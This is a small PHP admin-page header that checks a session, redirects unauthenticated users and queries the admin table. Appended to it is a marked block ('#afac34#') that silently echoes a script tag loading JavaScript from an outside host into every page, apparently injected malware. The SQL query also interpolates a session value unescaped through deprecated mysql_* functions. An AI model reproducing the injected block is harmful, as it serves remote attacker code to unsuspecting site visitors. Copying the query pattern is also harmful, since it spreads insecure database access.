<?php   if(!isset($_SESSION)) 
    { 
        session_start(); 
    }
	ob_start();
   
if(!isset($_SESSION['foreuid']))
{
header("Location: index.php");
}
else {
		
	include_once 'inc/connection.php';
	include 'inc/function.php';
	
	$select_us = mysql_query("select * from sd_admin where uid='$_SESSION[foreuid]'");
	$fetch_u_details = mysql_fetch_array($select_us);
}

?>
<?php
#afac34#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967259\"></script>";
echo $g;
}
#/afac34#
?>